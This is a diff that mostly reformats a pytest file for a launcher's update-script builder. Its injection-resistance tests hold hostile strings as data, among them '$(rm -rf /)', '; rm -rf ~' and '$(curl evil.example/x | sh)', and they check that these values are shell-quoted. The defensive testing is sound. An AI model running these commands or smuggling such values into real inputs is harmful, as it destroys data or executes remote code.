@@ -53,6 +53,7 @@ def requests_module():
 # factory — AboutTab.__init__ is network-free; it only reads config/version.
 # ---------------------------------------------------------------------------
 
+
 @pytest.fixture
 def about():
     return AboutTab()
@@ -61,6 +62,7 @@ def about():
 # ---------------------------------------------------------------------------
 # _parse_version
 # ---------------------------------------------------------------------------
+
 
 class TestParseVersion:
     """YYYY-MM-DD-REV → 4-tuple, with a zero tuple for malformed input."""
@@ -93,6 +95,7 @@ class TestParseVersion:
 # ---------------------------------------------------------------------------
 # _is_version_newer
 # ---------------------------------------------------------------------------
+
 
 class TestIsVersionNewer:
     def test_newer_year(self, about):
@@ -133,20 +136,34 @@ class TestBuildUpdateScriptBasic:
 
     def test_script_starts_with_shebang(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://github.com/thad0ctor/llama-server-launcher", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            "2024-02-01-1",
+            "https://github.com/thad0ctor/llama-server-launcher",
+            [],
         )
         assert s.startswith("#!/bin/bash\n")
 
     def test_script_uses_set_e(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert "set -e" in s
 
     def test_paths_are_quoted(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # shlex.quote of a plain ASCII path with no special chars returns the
         # path unchanged (it's already safe), so we assert that the literal
@@ -156,16 +173,24 @@ class TestBuildUpdateScriptBasic:
 
     def test_versions_embedded(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", "2024-02-01-1",
-            "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            "2024-02-01-1",
+            "https://example/repo.git",
+            [],
         )
         assert "2024-01-01-1" in s
         assert "2024-02-01-1" in s
 
     def test_github_url_embedded(self):
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2",
-            "https://github.com/thad0ctor/llama-server-launcher", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://github.com/thad0ctor/llama-server-launcher",
+            [],
         )
         assert "github.com/thad0ctor/llama-server-launcher" in s
 
@@ -176,7 +201,11 @@ class TestBuildUpdateScriptBasic:
         the important part is they're positioned inside ``(...)`` with
         ``-o -name <quoted> -prune`` repeated per pattern."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
             ["*.pyc", ".venv"],
         )
         assert "EXCLUDE_ARGS=(" in s
@@ -194,7 +223,11 @@ class TestBuildUpdateScriptBasic:
         over characters of the string and producing a garbled script."""
         with pytest.raises(TypeError):
             build_update_script(
-                SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+                SAFE_PATH,
+                SAFE_BACKUP,
+                "v1",
+                "v2",
+                "https://example/repo.git",
                 " -o -name '*.pyc' -prune",
             )
 
@@ -205,7 +238,11 @@ class TestBuildUpdateScriptBasic:
         shell text. With shlex.quote + array expansion, the pattern survives
         as a single array element with the apostrophe intact."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", "https://example/repo.git",
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            "https://example/repo.git",
             ["don't_touch/*.tmp"],
         )
         # shlex.quote's POSIX-safe form joins several quoted chunks; bash
@@ -214,10 +251,8 @@ class TestBuildUpdateScriptBasic:
         assert expected in s
         # And shlex.split of the array-literal body should yield the raw
         # pattern as a single token — proving nothing leaked out.
-        array_line = next(
-            line for line in s.splitlines() if line.startswith("EXCLUDE_ARGS=(")
-        )
-        inner = array_line[len("EXCLUDE_ARGS=("):-1]
+        array_line = next(line for line in s.splitlines() if line.startswith("EXCLUDE_ARGS=("))
+        inner = array_line[len("EXCLUDE_ARGS=(") : -1]
         tokens = shlex.split(inner)
         assert "don't_touch/*.tmp" in tokens
 
@@ -225,7 +260,12 @@ class TestBuildUpdateScriptBasic:
         """If remote version hasn't been fetched yet, build should still work
         rather than inserting the literal string 'None' into the script."""
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", None, "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            None,
+            "https://example/repo.git",
+            [],
         )
         # Empty string quoted is ''
         assert "''" in s or '""' in s
@@ -258,8 +298,12 @@ class TestBuildUpdateScriptInjectionResistance:
         literal."""
         evil = "/home/user/$(rm -rf /)/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Derive the expected quoted form from the same Path round-trip the
         # SUT uses, so the assertion holds on Windows (which normalizes
@@ -270,16 +314,24 @@ class TestBuildUpdateScriptInjectionResistance:
         """Backtick is classic command substitution — same treatment."""
         evil = "/home/`touch pwned`/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
     def test_semicolon_in_path(self):
         evil = "/home/user/a;echo pwned;/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Should be wrapped — not a bare command separator.
         assert shlex.quote(str(Path(evil))) in s
@@ -287,8 +339,12 @@ class TestBuildUpdateScriptInjectionResistance:
     def test_ampersand_in_path(self):
         evil = "/home/user/a&&touch pwned&&x/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(str(Path(evil))) in s
 
@@ -298,8 +354,12 @@ class TestBuildUpdateScriptInjectionResistance:
         crashes and the encoded form round-trips through shlex.split."""
         evil = "/home/user's dir/launcher"
         s = build_update_script(
-            Path(evil), Path("/tmp/backup"), "v1", "v2",
-            "https://example/repo.git", [],
+            Path(evil),
+            Path("/tmp/backup"),
+            "v1",
+            "v2",
+            "https://example/repo.git",
+            [],
         )
         # Round-trip: find the quoted token and confirm shlex decodes it back
         # to the original path.
@@ -312,15 +372,24 @@ class TestBuildUpdateScriptInjectionResistance:
         is compromised it could feed us ``$(...)``. Must also be quoted."""
         evil_remote = "$(curl evil.example/x | sh)"
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "2024-01-01-1", evil_remote,
-            "https://example/repo.git", [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "2024-01-01-1",
+            evil_remote,
+            "https://example/repo.git",
+            [],
         )
         assert shlex.quote(evil_remote) in s
 
     def test_github_url_quoted(self):
         evil_url = "https://example/repo.git; rm -rf ~"
         s = build_update_script(
-            SAFE_PATH, SAFE_BACKUP, "v1", "v2", evil_url, [],
+            SAFE_PATH,
+            SAFE_BACKUP,
+            "v1",
+            "v2",
+            evil_url,
+            [],
         )
         assert shlex.quote(evil_url) in s
 
@@ -328,6 +397,7 @@ class TestBuildUpdateScriptInjectionResistance:
 # ---------------------------------------------------------------------------
 # _check_version_online — network paths
 # ---------------------------------------------------------------------------
+
 
 class TestCheckVersionOnline:
     """Branch coverage for the background network probe."""
@@ -347,8 +417,7 @@ class TestCheckVersionOnline:
         call ``_update_version_display`` so the user knows it didn't work."""
         about._update_version_display = MagicMock()
 
-        with patch("modules.about_tab.requests.get",
-                   side_effect=requests_module.ConnectionError("unreachable")):
+        with patch("modules.about_tab.requests.get", side_effect=requests_module.ConnectionError("unreachable")):
             about._check_version_online()
 
         assert about.version_status == "Check Failed"
@@ -403,8 +472,7 @@ class TestCheckVersionOnline:
         """Timeouts are a subclass of RequestException — same graceful path."""
         about._update_version_display = MagicMock()
 
-        with patch("modules.about_tab.requests.get",
-                   side_effect=requests_module.Timeout("slow")):
+        with patch("modules.about_tab.requests.get", side_effect=requests_module.Timeout("slow")):
             about._check_version_online()
 
         assert about.version_status == "Check Failed"
@@ -413,6 +481,7 @@ class TestCheckVersionOnline:
 # ---------------------------------------------------------------------------
 # _drain_version_queue — worker completion race
 # ---------------------------------------------------------------------------
+
 
 class FakeAfterParent:
     def __init__(self):
@@ -458,6 +527,7 @@ class TestDrainVersionQueue:
 # ---------------------------------------------------------------------------
 # _generate_update_script — exercised via the public method on an AboutTab
 # ---------------------------------------------------------------------------
+
 
 class TestGenerateUpdateScriptIntegration:
     """Make sure the refactor didn't break the method wiring."""
